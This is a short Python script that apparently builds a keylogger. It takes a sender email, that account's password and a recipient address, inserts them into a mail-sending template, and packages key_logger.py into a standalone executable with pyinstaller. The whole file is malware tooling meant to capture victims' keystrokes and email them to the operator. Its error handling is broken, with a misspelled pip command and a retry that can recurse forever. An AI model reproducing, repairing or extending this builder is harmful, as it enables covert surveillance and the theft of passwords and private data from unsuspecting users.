import os


def init(mailid,passwd,rec_mail):
    with open(r"req/mailsender.py","r+") as file:
        content=file.read()
        content=content.replace("mailid",mailid)
        content=content.replace("rec_mail",rec_mail)
        content=content.replace("passwd",passwd)
    with open("newmail.py","a") as file:
        file.write(content)
    convert()

def convert():
    try:
        os.system("pyinstaller --onefile key_logger.py")
        # os.system("pyinstaller --onefile newmail.py")
        pass
    except:
        os.system("pip insall pyinstall")
        convert()

mailid=input("Enter the sender MailId:")
passwd=input("Enter the password:")
rec_mail=input("Enter the reciever Mail:")
init(mailid,passwd,rec_mail)